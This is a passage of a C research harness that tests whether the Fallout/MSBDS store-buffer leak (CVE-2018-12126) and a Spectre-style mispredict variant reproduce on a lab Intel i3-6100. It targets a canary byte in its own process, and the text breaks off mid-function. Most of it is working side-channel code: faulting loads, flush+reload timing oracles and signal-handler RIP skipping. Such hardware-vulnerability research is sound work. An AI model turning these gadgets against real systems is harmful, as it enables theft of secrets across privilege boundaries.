/*
 * Fallout (MSBDS, CVE-2018-12126) one-shot on the i3-6100 lab.
 *
 * Known 2019 bug. Canary only. Same thread. No kernel secret, no sibling thread.
 *
 * Current experiment, one process, nostore then fence then store:
 *   page_v     present. The canary is stored at PAGE_OFFSET.
 *   page_atk   PROT_NONE. The faulting load uses the same page offset.
 *              The SIGSEGV handler skips the oracle access, so it does not retire.
 *   page_block present. An older load misses at BLOCK_OFFSET. That is an
 *              attempt to keep the canary store from retiring before the
 *              fault. It is not a measurement that the miss is still in
 *              flight at the sample, and retirement is not the moment a
 *              store-buffer entry stops being sampleable. The stock arms take
 *              a fault; TRIGGER=assist and TRIGGER=demand below are the
 *              non-SIGSEGV paths, added 2026-09-28.
 *   fence      mfence after the store dependency and before the fault.
 *
 * Three claims stay separate:
 *   1. Decoder. SELFTEST touches one oracle class architecturally and checks
 *      that reload reports it. The geometry probe checks that a same-set load
 *      heats a flushed line on an immediate reload. Neither path takes the
 *      fault, the handler, or the return from the signal.
 *   2. Dependent transient access. Shown for PROBE=1, which has no canary
 *      store. fixed leaves class 0x15 hot, 8/8, unique, so an oracle load
 *      after the faulting load can survive the signal handler. dep, after
 *      poisoning al with 0x2a, also leaves class 0x15 rather than 0x3f, so
 *      the index is not the preserved poison. The low six bits of the value
 *      the xor consumed are 0. That does not show the whole byte is 0x00.
 *      The handler sets RIP past the oracle load, so that access does not
 *      retire. On the recorded canary-arm runs with this same handler, class
 *      21 was cold, so a set-21 touch would have to be specific to the probe
 *      sequence. That narrows the alternative; it does not close it. dep
 *      shows the faulting load feeds the dependency chain something whose
 *      low six bits are 0: preserved poison would have been class 63, not 21.
 *      That rules out "a dependent transient signal on this path is always
 *      wiped". The whole byte is unobserved, and so is the mechanism. The
 *      recorded 8/8 is eight samples of that one class role, not 512
 *      executions: each class in a scan is its own attempt.
 *      Other set-0 accesses remain an alternative the canary runs do not
 *      rule out; the geometry probe shows that effect only for its own
 *      sequence and an immediate reload. The same fault path does not
 *      guarantee the same window once the store arm adds its store and
 *      address dependency. The probe does not rule out a miss of that
 *      access on the store attempts.
 *      VALUE=1 puts the dep trick on the arm tails: al=0x2a, faulting load,
 *      xor 0x3f. Class 21 means al stayed 0x2a. Class 63 means the low six
 *      bits of the value the xor consumed are 0, not that the byte is 0x00.
 *      Class 61 means those bits are 2, so the byte is one of 0x02, 0x42,
 *      0x82, 0xC2. It does not show a store-buffer source. A hit on class 0
 *      is v & 0x3f == 0x3f and is not interpreted. A full-scan round is one
 *      trial per class. Missing the canary class does not settle "forwarding
 *      did not happen".
 *      2026-09-27, CPU 1: nostore, fence, and store each showed class 63,
 *      8/8, unique, class 0 cold, class 61 cold. In that sequence the signal
 *      matches zero low six bits after the faulting load, and the canary
 *      class was not observed. That is not a proof that this CPU or
 *      microcode never forwards a store-buffer entry.
 *   3. Store-buffer origin. Not shown. A fault does not by itself forward a
 *      store-buffer entry. No TSX only means this is not the paper's TSX
 *      variant. It does not show that no fault or assist on this CPU can
 *      forward.
 *
 * PAGE_OFFSET 0x40 is set 1. BLOCK_OFFSET 0xC0 is set 3. The default canary
 * 0x42 is class 2. A PROT_NONE run that placed the blocker at offset 0 and
 * the victim byte at offset 7 aliased oracle class 0; a hot class 0 in that
 * log is not evidence of a forwarded zero. The race between store retirement
 * and the page walk is a hypothesis, not a cause established by these runs.
 *
 * PASS: a majority of store rounds have the canary class hot, every store
 * attempt faults, and no fence or nostore round has that class hot.
 *
 * Environment:
 *   CPU=<n>       logical CPU to pin to (default 1)
 *   ROUNDS=<n>    rounds per arm, 1..64 (default 8)
 *   TRIALS=<n>    executions of one slot in a SLOT/MATRIX round, 1..256
 *                 (default 64)
 *   CANARY=<hex>  byte stored on page_v (default 0x42, class 0x02)
 *   SELFTEST=1    geometry and architectural decode only, then exit
 *   SLOT=<c>      one class, TRIALS executions per round, hit rate per
 *                 execution. With PROBE=1, fixed and dep. With VALUE=1, the
 *                 three arms.
 *   MATRIX=1      VALUE key on slots 21, 63, and 61, three arms, TRIALS each.
 *   NC=1          fault address is the non-canonical base 0x9876543214321000
 *                 plus PAGE_OFFSET (#GP). TRIGGER=noncanon is the same switch.
 *   VFLUSH=1      clflush the victim line before the canary store.
 *   GADGET=ref    store then the faulting load are adjacent. No miss block,
 *                 no reload of the victim, no lea. The xor key stays.
 *                 Each of these is its own sequence. The two-process rule
 *                 applies to that sequence only.
 *   FRESH=1       a new victim page before every attempt, no write at offset 0.
 *   OFFSET=<hex>  store/fault page offset (default 0x40), 0..0xfff.
 *
 * SLOT/MATRIX repeatability, fixed before those runs: a hit is reload < 150.
 * A round is a majority round when hits * 2 > TRIALS. An arm and slot are
 * repeatable in one process when majority_rounds * 2 > ROUNDS. Either
 * pre-registered sentence needs two processes. Negative, only if both runs
 * have slot 63 repeatable on nostore and on store, and slot 61 repeatable
 * on neither: in that sequence both arms show a signal consistent with zero
 * low six bits after the faulting load, and the canary class is not
 * observed. Positive, only if both runs have slot 61 repeatable on store
 * and not on nostore: a signal consistent with class 61 after the faulting
 * load, with the store present as a condition, local to this geometry, and
 * not an origin claim. Fence is recorded and is not part of either sentence.
 * Slot 0 is not interpreted.
 *
 * FRESH=1 maps a new page_v before every attempt, uniform across arms and
 * with no write at offset 0. The VALUE/MATRIX runs before 2026-09-27 used
 * one long-lived, pre-touched page. Pre-registered for VALUE=1 SLOT=61
 * FRESH=1, two processes: POSITIVE if both runs have slot 61 (the canary
 * class) majority repeatable on store and not on nostore, a
 * store-conditioned class-61 signal on a fresh page local to this geometry.
 * NEGATIVE if slot 61 stays not repeatable on store in both runs; the
 * class-key detector then does not see the byte even on a fresh page, and
 * the next cut is GADGET=ref (no MISS_BLOCK) before any further claim.
 * Fence is recorded and is not part of either sentence. A mixed rate is not
 * evidence for either sentence.
 *
 * ---------------------------------------------------------------------------
 * 2026-09-28: non-faulting triggers. TRIGGER=<t> selects the sampling shape;
 * NC=1 stays an alias for TRIGGER=noncanon so every logged run keeps its
 * meaning.
 *
 *   TRIGGER=noncanon  #GP on the non-canonical base. The only trigger that
 *                     has produced class 61 on this box.
 *   TRIGGER=protnone  #PF on a PROT_NONE page. Reads 0/10 processes.
 *   TRIGGER=assist    page_atk is PRESENT; madvise(MADV_COLD) clears the PTE
 *                     accessed bit before every attempt, so the load takes a
 *                     microcode A-bit assist and RETIRES. No SIGSEGV, so
 *                     faults=0 is expected.
 *   TRIGGER=demand    page_atk is PRESENT; madvise(MADV_DONTNEED) before every
 *                     attempt, so the load takes a demand-zero minor #PF that
 *                     the kernel resolves. Also faults=0. Same fault family as
 *                     protnone, which is at the floor; the prior is low.
 *
 * For assist and demand the load retires with the true byte 0x00, so class 63
 * is touched architecturally on every attempt. That is a liveness control, not
 * a signal: it proves the gadget ran and the decoder works, nothing more. The
 * signal of interest stays class 61.
 *
 * The trap that voids this arm: clear_refs and MADV_COLD both skip the shared
 * zero page (vm_normal_page() returns NULL). A freshly mmap'd anonymous page
 * that has only ever been READ is the shared zero page, so the clear is a
 * no-op, no assist ever happens, class 63 goes hot, class 61 stays cold, and
 * the run looks like a clean negative while measuring nothing. page_atk is
 * therefore memset at setup, and ASSIST_GATE checks the accessed bit really
 * moves (Referenced: 4 kB -> 0 kB -> 4 kB) before any number is recorded.
 * A run without that witness is VOID, not negative.
 *
 * SPEC=1 replaces the fault with a mispredicted branch (Kocher bounds-check
 * bypass, ported from labs/foreshadow/harness/mispredict_gadget.h). The load
 * never faults and never retires. Prior against it: l1tf-mp-probe.c measured
 * that L1TF does not forward in the misprediction window on this silicon. That
 * is a statement about the terminal-fault forward, not about the store buffer,
 * and the gadget itself is sound (256/256 on present targets), so this leg is
 * untested rather than refuted.
 *
 *   SPEC_TARGET=noncanon|present|protnone   default noncanon (highest prior).
 *                     present reads a PRESENT page at the same page offset as
 *                     the canary store whose true content is 0x00: if the
 *                     store buffer forwards on a page-offset-only match, class
 *                     61 lights up. In present mode class 63 hot is CORRECT --
 *                     it is the transient liveness control. In noncanon and
 *                     protnone there is no data source, so 63 goes dark and
 *                     the gate is the only liveness control.
 *   SPEC_STORE=late|early|none              late (default) puts the canary
 *                     store immediately before the gadget call on every inner
 *                     iteration, uniformly across training and attack. none is
 *                     the floor arm.
 *   SPEC_VFLUSH=0|1   default 1: clflush the victim line before the store, so
 *                     the RFO takes DRAM latency and the entry lingers in the
 *                     store buffer across the bound-resolution window.
 *   SPEC_TFLUSH=0|1   flush the target line (present target only).
 *   SPEC_DELAY=<n>    delay-loop iterations before the gadget call.
 *   SPEC_SELFTEST=1|2 run one gate leg alone and exit.
 *
 * SPEC gate, enforced in-process before any scoring because the misprediction
 * rate is state-dependent: leg 1 plants 0x42 architecturally in a present
 * target with the store off and must recover class 61; leg 2 plants 0x00 and
 * must give class 63 repeatable with class 61 at the floor. Leg 2 measures the
 * class-61 false-positive rate that the negative sentence depends on. Gate
 * failure is VOID.
 *
 * FENCE and LFENCE lose their diagnostic power under SPEC: they destroy the
 * speculation window as well as the store-buffer window. The load-bearing
 * controls for SPEC are SPEC_STORE=none and gate leg 2.
 *
 * Geometry for the new arms. Transform (v ^ 0x3f) & 0x3f, and set(class c)==c
 * because the slot stride 0x1040 is 65 lines. 0x42 -> 61 (signal), 0x00 -> 63
 * (liveness), 0x10 -> 47 (SPEC training). Excluded from any claim: 0 (not
 * interpreted), 1 (page_atk+0x40 and page_v+0x40 are both L1 set 1), 3
 * (page_block+0xC0), 47 (training) and 48 (its stride preheat), 60 and 62 (the
 * neighbours of 61 -- the hardware stride prefetcher preheats slot +0x1040).
 * spec_bound is clflush'd and reloaded every inner iteration, so its line is
 * hot every iteration; it is placed at a fixed mmap'd offset (set 11) instead
 * of being left to the linker, and its set is printed. The new arms are
 * SLOT-only: a sequential full scan preheats class c+1, so a reload of class
 * 60 would preheat 61.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <ucontext.h>
#include <unistd.h>

#define SLOT_SIZE      0x1040
#define LO_CLASSES     64
#define HOT_CYCLES     150
#define DEFAULT_CPU    1
#define DEFAULT_ROUNDS 8
#define DEFAULT_CANARY 0x42
#define MAX_ROUNDS     64
static int page_offset = 0x40; /* default; OFFSET=<hex> overrides */
#define PAGE_OFFSET    page_offset /* set 1 by default; not 0, not the canary class */
#define BLOCK_OFFSET   0xC0 /* set 3; the retirement-blocking miss */
#define PROBE_CLASS    0x15 /* set 21; not set 0, 1, or 3 */
#define VALUE_POISON   0x2a
#define VALUE_XOR      0x3f
#define CLS_POISON     ((VALUE_POISON ^ VALUE_XOR) & 0x3f) /* 21 */
#define CLS_ZERO       ((0x00 ^ VALUE_XOR) & 0x3f)         /* 63 */
#define CLS_CANARY     ((0x42 ^ VALUE_XOR) & 0x3f)         /* 61 */
#define NC_BASE        0x9876543214321000ull

/* 2026-09-28 additions. MADV_COLD is 20 since Linux 5.4; define it so the
 * build does not depend on the header vintage. */
#ifndef MADV_COLD
#define MADV_COLD      20
#endif

#define TRIG_PRETOUCH_OFF 0x800 /* set 32; sets A and D on page_v's PTE without
                                 * touching the victim line, so the canary
                                 * store does not take its own assist */

#define SPEC_TRAIN_VAL 0x10  /* training byte -> class 47 */
#define SPEC_TRAIN_IDX 0x10  /* in-bounds index; spec_array+0x10 is L1 set 0 */
#define CLS_TRAIN      ((SPEC_TRAIN_VAL ^ VALUE_XOR) & 0x3f) /* 47 */
#define SPEC_BOUND_VAL 0x20  /* > SPEC_TRAIN_IDX, << every malicious index */
#define SPEC_BOUND_OFF 0x2C0 /* set 11; not 61, not 63, not their neighbours */
#define SPEC_INNER     30    /* interleaved iterations; malicious every 6th */
#define SPEC_DELAY_DEF 100

/* Region layout, one mmap so the malicious index is a positive offset from
 * spec_array (an out-of-bounds unsigned index, never architecturally taken). */
#define SPEC_OFF_ARRAY   0x0000
#define SPEC_OFF_BOUND   0x1000
#define SPEC_OFF_PRESENT 0x2000
#define SPEC_OFF_PROTNON 0x3000
#define SPEC_REGION_SZ   0x4000

enum trigger_id {
    TRIG_PROTNONE = 0,
    TRIG_NONCANON,
    TRIG_ASSIST,
    TRIG_DEMAND
};

enum spec_target_id {
    SPEC_TGT_NONCANON = 0,
    SPEC_TGT_PRESENT,
    SPEC_TGT_PROTNONE
};

enum spec_store_id {
    SPEC_ST_LATE = 0,
    SPEC_ST_EARLY,
    SPEC_ST_NONE
};

enum arm_id {
    ARM_NOSTORE = 0,
    ARM_FENCE,
    ARM_STORE,
    ARM_COUNT
};

static const char *arm_name[] = { "nostore", "fence", "store" };

static char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];

static uint8_t *page_v;
static uint8_t *page_atk;
static uint8_t *page_block;
static void *volatile skip_to;
static volatile unsigned long fault_count;
static int canary = DEFAULT_CANARY;
static int rounds = DEFAULT_ROUNDS;
static int trials = 64;
static int slot_only = -1;
static int use_nc = 0;
static int use_vflush = 0;
static int use_ref = 0;
static int use_fresh = 0;
static int use_sj = 0;
static int use_cseq = 0;
static int cseq_store = 1;
static int cseq_block = 0;
static int cseq_asmstore = 0;
static int cseq_rip = 0;
static int cseq_sjfirst = 0;
static int cseq_fence = 0;
static int cseq_lfence = 0;
static int cseq_loadal = 0;
static int cseq_asmchain = 0;
static int cseq_poison = 0;
static int cseq_vf = 0;
static int cseq_prologue = 0;
static int cseq_vaddr = 0;
static int cseq_noppre = 0;
static int cseq_poison_full = 0;
static int cseq_poison_other = 0;
static jmp_buf sj_buf;

/* 2026-09-28 arms. Scalars and pointers only: no new large statics, because
 * moving oracle_lo in .bss would change its physical backing and therefore its
 * L2/LLC conflict profile -- a plausible lever on the documented bimodality. */
static int trig_mode = TRIG_PROTNONE;
static int trig_zero_fault = 0;
static unsigned long trig_madv_fail;
static int use_spec = 0;
static int spec_target = SPEC_TGT_NONCANON;
static int spec_selftest = 0;
static int spec_tflush = 0;
static int spec_vflush = 1;
static int spec_delay = SPEC_DELAY_DEF;
static int spec_store_mode = SPEC_ST_LATE;
static volatile unsigned long stray_faults;

static uint8_t *spec_region;
static uint8_t *spec_array;
static uint8_t *spec_present;
static uint8_t *spec_target_p;
static volatile size_t *spec_bound_p;
static char *volatile spec_oracle;
static size_t spec_malicious_x;
static size_t spec_training_x = SPEC_TRAIN_IDX;

static void fault_handler(int sig, siginfo_t *si, void *ctx)
{
    ucontext_t *uc = (ucontext_t *)ctx;

    (void)sig;
    (void)si;
    fault_count++;
    uc->uc_mcontext.gregs[REG_RIP] = (greg_t)skip_to;
}

static void sj_handler(int sig)
{
    sigset_t set;

    sigemptyset(&set);
    sigaddset(&set, sig);
    sigprocmask(SIG_UNBLOCK, &set, NULL);
    fault_count++;
    longjmp(sj_buf, 1);
}

/*
 * Zero-fault arms must never take a SIGSEGV. Falling through to sj_handler
 * would longjmp into a frame those arms never setjmp'd, which is undefined
 * and would swallow the failure silently. Fail loudly instead.
 */
static void guard_handler(int sig, siginfo_t *si, void *ctx)
{
    static const char msg[] = "verdict: VOID stray_fault\n";

    (void)sig;
    (void)si;
    (void)ctx;
    stray_faults++;
    if (write(STDOUT_FILENO, msg, sizeof(msg) - 1) < 0) {
        /* nothing useful to do in a handler that is about to _exit */
    }
    _exit(3);
}

static inline void flush_line(void *p)
{
    asm volatile(
        "clflush (%0)\n\t"
        "mfence\n\t"
        "lfence\n\t"
        :: "r"(p) : "memory");
}

static inline uint64_t reload_time(void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    asm volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    asm volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    asm volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

/*
 * Older L1 miss, issued before the canary store, with no lfence or mfence
 * between them. This does not measure whether the miss is still outstanding
 * when the faulting load runs, and it does not show when the store-buffer
 * entry itself goes away. Instruction age is not that timestamp.
 */
#define MISS_BLOCK \
    "clflush (%[block])\n\t" \
    "movl (%[block]), %%ecx\n\t"

#define LEAK_TAIL \
    "movb (%%rax), %%al\n\t" \
    "movzbl %%al, %%eax\n\t" \
    "and $0x3f, %%eax\n\t" \
    "imul %[slot], %%rax\n\t" \
    "movq (%[oracle], %%rax), %%rdi\n\t"

/* Poison, fault through rax, xor. Class 21 / 63 / 61 as in the VALUE key.
 * NOPOISON drops only the 0x2a store. The xor stays, so slot 61 is still
 * the canary class. That is one cut against the -O2 class-key binary. */
#ifdef NOPOISON
#define VALUE_POISON_INSN
#else
#define VALUE_POISON_INSN "movb $0x2a, %%al\n\t"
#endif
#define VALUE_TAIL \
    VALUE_POISON_INSN \
    "movb (%%rax), %%al\n\t" \
    "xorb $0x3f, %%al\n\t" \
    "movzbl %%al, %%eax\n\t" \
    "and $0x3f, %%eax\n\t" \
    "imul %[slot], %%rax\n\t" \
    "movq (%[oracle], %%rax), %%rdi\n\t"

static void leak_load(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "movb (%[atk]), %%al\n\t"
        "movzbl %%al, %%eax\n\t"
        "and $0x3f, %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdi", "memory");
}

static void leak_store(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "movb %b[can], (%[victim])\n\t"
        "movzbl (%[victim]), %%edx\n\t"
        "shr $12, %%edx\n\t"
        "lea (%[atk], %%rdx), %%rax\n\t"
        LEAK_TAIL
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [can] "r"((unsigned long)canary),
          [victim] "r"(page_v + PAGE_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdx", "rdi", "memory");
}

static void leak_fence(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "movb %b[can], (%[victim])\n\t"
        "movzbl (%[victim]), %%edx\n\t"
        "shr $12, %%edx\n\t"
        "lea (%[atk], %%rdx), %%rax\n\t"
        "mfence\n\t"
        LEAK_TAIL
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [can] "r"((unsigned long)canary),
          [victim] "r"(page_v + PAGE_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdx", "rdi", "memory");
}

static void arm_action(int arm)
{
    if (arm == ARM_STORE)
        leak_store();
    else if (arm == ARM_FENCE)
        leak_fence();
    else
        leak_load();
}

/* FRESH=1: a new victim page before every attempt, no write at offset 0. */
static void fresh_page_v(void)
{
    if (page_v != NULL)
        munmap(page_v, 0x1000);
    page_v = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page_v == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        exit(2);
    }
}

static void leak_load_value(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "mov %[atk], %%rax\n\t"
        VALUE_TAIL
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdi", "memory");
}

static void leak_store_value(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "test %[vf], %[vf]\n\t"
        "jz 3f\n\t"
        "clflush (%[victim])\n\t"
        "3: movb %b[can], (%[victim])\n\t"
        "movzbl (%[victim]), %%edx\n\t"
        "shr $12, %%edx\n\t"
        "lea (%[atk], %%rdx), %%rax\n\t"
        VALUE_TAIL
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [can] "r"((unsigned long)canary),
          [victim] "r"(page_v + PAGE_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [vf] "r"((unsigned long)use_vflush),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdx", "rdi", "memory");
}

static void leak_fence_value(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "test %[vf], %[vf]\n\t"
        "jz 3f\n\t"
        "clflush (%[victim])\n\t"
        "3: movb %b[can], (%[victim])\n\t"
        "movzbl (%[victim]), %%edx\n\t"
        "shr $12, %%edx\n\t"
        "lea (%[atk], %%rdx), %%rax\n\t"
        "mfence\n\t"
        VALUE_TAIL
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [can] "r"((unsigned long)canary),
          [victim] "r"(page_v + PAGE_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [vf] "r"((unsigned long)use_vflush),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdx", "rdi", "memory");
}

/* Adjacent store then fault. The fault address is already in rdx. */
static void leak_load_ref(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        "mov %[atk], %%rdx\n\t"
        "movb $0x2a, %%al\n\t"
        "movb (%%rdx), %%al\n\t"
        "xorb $0x3f, %%al\n\t"
        "movzbl %%al, %%eax\n\t"
        "and $0x3f, %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [atk] "r"(page_atk + PAGE_OFFSET),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rdx", "rdi", "memory");
}

static void leak_store_ref(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        "mov %[atk], %%rdx\n\t"
        "test %[vf], %[vf]\n\t"
        "jz 3f\n\t"
        "clflush (%[victim])\n\t"
        "3:\n\t"
        "movb $0x2a, %%al\n\t"
        "movb %b[can], (%[victim])\n\t"
        "movb (%%rdx), %%al\n\t"
        "xorb $0x3f, %%al\n\t"
        "movzbl %%al, %%eax\n\t"
        "and $0x3f, %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [atk] "r"(page_atk + PAGE_OFFSET),
          [victim] "r"(page_v + PAGE_OFFSET),
          [can] "r"((unsigned long)canary),
          [vf] "r"((unsigned long)use_vflush),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rdx", "rdi", "memory");
}

static void leak_fence_ref(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        "mov %[atk], %%rdx\n\t"
        "test %[vf], %[vf]\n\t"
        "jz 3f\n\t"
        "clflush (%[victim])\n\t"
        "3: movb %b[can], (%[victim])\n\t"
        "mfence\n\t"
        "movb $0x2a, %%al\n\t"
        "movb (%%rdx), %%al\n\t"
        "xorb $0x3f, %%al\n\t"
        "movzbl %%al, %%eax\n\t"
        "and $0x3f, %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [atk] "r"(page_atk + PAGE_OFFSET),
          [victim] "r"(page_v + PAGE_OFFSET),
          [can] "r"((unsigned long)canary),
          [vf] "r"((unsigned long)use_vflush),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rdx", "rdi", "memory");
}

/*
 * Same fault window as leak_load. fixed discards the loaded byte and touches
 * PROBE_CLASS. dep first puts 0x2a in al, then the faulting load, then xors
 * PROBE_CLASS. If the load does not update al, the index is 0x2a^0x15 = 0x3f.
 * If the low six bits of the value the xor consumes are 0, the index is
 * PROBE_CLASS. The and with 0x3f discards the top two bits, so this does not
 * observe whether the whole byte is 0x00. A prior reload of a zeroed oracle
 * slot would otherwise leave al at 0 and make those two cases look alike.
 * There is no canary store in either probe. The store arm's extra store and
 * dependency are a different window.
 */
static void leak_fixed(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "movb (%[atk]), %%al\n\t"
        "movl %[cls], %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [cls] "i"(PROBE_CLASS),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdi", "memory");
}

static void leak_dep(void)
{
    asm volatile(
        "lea 2f(%%rip), %%rax\n\t"
        "mov %%rax, %0\n\t"
        MISS_BLOCK
        "movb $0x2a, %%al\n\t"
        "movb (%[atk]), %%al\n\t"
        "xorb %[cls], %%al\n\t"
        "movzbl %%al, %%eax\n\t"
        "and $0x3f, %%eax\n\t"
        "imul %[slot], %%rax\n\t"
        "movq (%[oracle], %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : [block] "r"(page_block + BLOCK_OFFSET),
          [atk] "r"(page_atk + PAGE_OFFSET),
          [cls] "i"(PROBE_CLASS),
          [oracle] "r"(oracle_lo),
          [slot] "r"((unsigned long)SLOT_SIZE)
        : "rax", "rcx", "rdi", "memory");
}

static void maccess_line(void *p) __attribute__((noinline));
static void maccess_line(void *p)
{
    asm volatile("movq (%0), %%rax\n" :: "c"(p) : "rax");
}

/*
 * CSEQ=1, SLOT=<cls>: the ref-rate-shaped attempt cloned into this binary.
 * Store as a C statement, setjmp between the store and the fault, index in
 * C, touch through a call, longjmp handler. NOSTORE=1 skips the store;
 * CSEQ_BLOCK adds the stock older-miss block before the store,
 * CSEQ_ASMSTORE uses the stock asm store instruction, CSEQ_RIP uses the
 * RIP-skip handler without setjmp, CSEQ_SJFIRST puts setjmp before the
 * store, CSEQ_POISON adds the stock al=0x2a poison before the faulting
 * load, CSEQ_NOPPRE a single nop in the poison's place, CSEQ_POISON_FULL a
 * full-width eax write in its place, CSEQ_POISON_OTHER a partial write to
 * dl, CSEQ_VF the stock test/jz + conditional clflush branch before the
 * store, CSEQ_PROLOGUE the stock skip_to prologue before the block, and
 * CSEQ_VADDR the stock victim-byte-dependent fault address. CSEQ_SCAN
 * appends one full 64-class scan after the rounds. The index uses
 * the VALUE transform, so slot 61 is the canary class for canary 0x42.
 * Two processes before any sentence.
 */
static void cseq_miss_block(void)
{
    if (!cseq_block)
        return;
    asm volatile("clflush (%0)\n\tmovl (%0), %%ecx\n\t"
                 :: "r"(page_block + BLOCK_OFFSET) : "rcx", "memory");
}

static void cseq_store_canary(void)
{
    if (!cseq_store)
        return;
    if (cseq_asmstore)
        asm volatile("movb %b0, (%1)\n\t"
                     :: "r"((unsigned long)canary),
                        "r"(page_v + PAGE_OFFSET) : "memory");
    else
        *(volatile unsigned char *)(page_v + PAGE_OFFSET) =
            (unsigned char)canary;
}

static void cseq_barrier(void)
{
    if (cseq_fence)
        asm volatile("mfence" ::: "memory");
    else if (cseq_lfence)
        asm volatile("lfence" ::: "memory");
}

static void leak_cseq(void)
{
    if (cseq_rip) {
        unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;

        cseq_miss_block();
        cseq_store_canary();
        cseq_barrier();
        asm volatile("" ::: "memory");
        skip_to = &&cseq_done;
        asm volatile("" ::: "memory");
        maccess_line(oracle_lo + (size_t)SLOT_SIZE *
                     (size_t)((atk[0] ^ 0x3f) & 0x3f));
    cseq_done:
        return;
    }
    if (cseq_sjfirst) {
        if (setjmp(sj_buf) == 0) {
            unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;

            cseq_miss_block();
            cseq_store_canary();
            cseq_barrier();
            asm volatile("" ::: "memory");
            maccess_line(oracle_lo + (size_t)SLOT_SIZE *
                         (size_t)((atk[0] ^ 0x3f) & 0x3f));
        }
        return;
    }
    if (cseq_prologue) {
        skip_to = &&cseq_pdone;
        asm volatile("" ::: "memory");
    }
    cseq_miss_block();
    if (cseq_vf) {
        asm volatile("test %0, %0\n\t"
                     "jz 1f\n\t"
                     "clflush (%1)\n\t"
                     "1:"
                     :: "r"((unsigned long)use_vflush),
                        "r"(page_v + PAGE_OFFSET)
                     : "memory");
    }
    cseq_store_canary();
    cseq_barrier();
    asm volatile("" ::: "memory");
    if (setjmp(sj_buf) == 0) {
        unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;
        unsigned long off;

        asm volatile("" ::: "memory");
